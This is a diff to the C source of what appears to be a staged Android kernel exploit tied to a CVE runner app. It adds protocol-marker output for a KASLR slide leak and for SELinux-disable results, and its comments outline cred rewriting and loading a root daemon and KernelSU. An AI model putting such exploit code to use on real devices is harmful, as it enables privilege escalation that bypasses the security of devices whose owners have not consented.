@@ -370,6 +370,24 @@ static void elog(const char *fmt, ...)
     free(buf);
 }
 
+/* 宿主协议行：裸输出、不着色、不走 clog_line()。
+ *
+ * 铁律：APK（Cve98260Runner）只认固定前缀的协议行取结果，人读日志里
+ * 同值的 [slide]/[leak]/[selinux] 行是给人看的 —— 改文案不会影响人，
+ * 但会让宿主解析不到、把成功判成失败（--kaslr-only 就这么栽过一次：
+ * 71b7db6 把 printf("C98260_SLIDE=...") 改成 LOG_LEAK("[slide] ...")，
+ * 从此 APK 永远拿不到 slide）。因此协议行必须单独占一行、行首就是
+ * marker、纯 ASCII、不掺 ANSI。 */
+static void marker(const char *fmt, ...)
+{
+    va_list ap;
+    va_start(ap, fmt);
+    vdprintf(STDOUT_FILENO, fmt, ap);
+    va_end(ap);
+    dprintf(STDOUT_FILENO, "\n");
+    fflush(stdout);
+}
+
 #define LOG_INFO(fmt, ...)  clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 正常运行 */
 #define LOG_OK(fmt, ...)    clog_line(C_GREEN,  fmt, ##__VA_ARGS__)  /* 成功 */
 #define LOG_WARN(fmt, ...)  clog_line(C_YELLOW, fmt, ##__VA_ARGS__)  /* 警告 */
@@ -1939,6 +1957,10 @@ static int stage_a_calibrate_slide(void)
     STAGE_LOG("site=%#" PRIx64 " count=%d slide=%#" PRIx64 " _text=%#" PRIx64,
               best_site, best_count, g_slide, UINT64_C(0xffffffc008000000) + g_slide);
     disarm_kmem_cache_alloc();
+    /* 宿主协议行。APK 的 KASLR 卡片只认这一行（Cve98260Runner.SLIDE_MARKER），
+     * 上面那条人读日志给它解析不了 —— 少了这行，「地址明明泄露出来了，
+     * UI 还是报失败」。 */
+    marker("C98260_SLIDE=0x%" PRIx64, g_slide);
     return 0;
 }
 
@@ -3464,6 +3486,9 @@ static int stage_d_disable_selinux(void)
             }
             LOG_WARN("[selinux] 已跳过 enforce 回读，DONE 仅表示写原语执行完毕，"
                      "实际 SELinux 状态未确认");
+            /* 协议行：APK 由这两行区分「写已执行但未回读」与「没写成功」。 */
+            marker("C98260_SELINUX_ONLY_DONE=1");
+            marker("C98260_SELINUX_UNVERIFIED=1");
             log_sync(); disarm_all();
             return 0;
         }
@@ -3479,6 +3504,8 @@ static int stage_d_disable_selinux(void)
                 /* 目标达成：不进 cred 改写循环、不 fork rootd、不加载 KSU。
                  * 本模式没有伪造 cred 持有者，可直接退出。 */
                 STAGE_LOG("仅关闭 SELinux 模式：在改写 cred 之前停止");
+                /* 协议行：APK 据此报「SELinux is permissive」。 */
+                marker("C98260_SELINUX_ONLY_DONE=1");
                 log_sync(); disarm_all();
                 return 0;   /* 用特殊返回码通知 main 提前收尾 */
             }
